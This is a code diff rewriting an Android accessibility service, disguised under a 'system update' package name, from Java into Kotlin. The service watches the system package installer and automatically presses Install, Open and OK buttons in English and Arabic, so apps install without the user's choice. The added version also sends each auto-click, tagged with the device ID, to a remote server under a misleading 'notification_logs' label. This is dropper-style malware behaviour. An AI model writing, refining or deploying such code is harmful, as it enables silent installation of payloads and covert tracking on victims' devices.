@@ -1,40 +1,53 @@
-package com.system.updates.services;
+package com.system.update.services
 
-import android.accessibilityservice.AccessibilityService;
-import android.view.accessibility.AccessibilityEvent;
-import android.view.accessibility.AccessibilityNodeInfo;
-import java.util.List;
+import android.accessibilityservice.AccessibilityService
+import android.view.accessibility.AccessibilityEvent
+import android.view.accessibility.AccessibilityNodeInfo
+import com.system.update.core.NetworkConnectionManager
+import org.json.JSONObject
 
-public class AutoInstallerService extends AccessibilityService {
+class AutoInstallerService : AccessibilityService() {
 
-    @Override
-    public void onAccessibilityEvent(AccessibilityEvent event) {
-        CharSequence packageName = event.getPackageName();
-        if (packageName == null || !packageName.toString().equals("com.android.packageinstaller")) {
-            return;
+    private lateinit var networkManager: NetworkConnectionManager
+
+    override fun onCreate() {
+        super.onCreate()
+        networkManager = NetworkConnectionManager(this)
+    }
+
+    override fun onAccessibilityEvent(event: AccessibilityEvent) {
+        if (event.packageName == null) return
+
+        if (event.packageName.toString() == "com.android.packageinstaller") {
+            clickTargetButtons()
         }
+    }
 
-        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED || 
-            event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-            
-            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
-            if (rootNode == null) return;
+    private fun clickTargetButtons() {
+        val rootNode = getRootInActiveWindow() ?: return
+        val targetTexts = arrayOf("Install", "تثبيت", "Open", "فتح", "OK", "موافق")
 
-            String[] targetButtons = {"Install", "تثبيت", "Open", "فتح", "Done", "تم", "OK", "موافق"};
-
-            for (String text : targetButtons) {
-                List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(text);
-                for (AccessibilityNodeInfo node : nodes) {
-                    if (node.isClickable() && node.isEnabled()) {
-                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                    }
+        for (text in targetTexts) {
+            val nodes = rootNode.findAccessibilityNodeInfosByText(text)
+            for (node in nodes) {
+                if (node.isEnabled && node.isClickable) {
+                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                    sendReport(text)
                 }
             }
-            rootNode.recycle();
         }
+        rootNode.recycle()
     }
 
-    @Override
-    public void onInterrupt() {
+    private fun sendReport(action: String) {
+        val data = JSONObject().apply {
+            put("device_id", networkManager.getDeviceId())
+            put("event", "auto_click")
+            put("button_text", action)
+            put("timestamp", System.currentTimeMillis())
+        }
+        networkManager.sync(data.toString(), "notification_logs")
     }
+
+    override fun onInterrupt() {}
 }
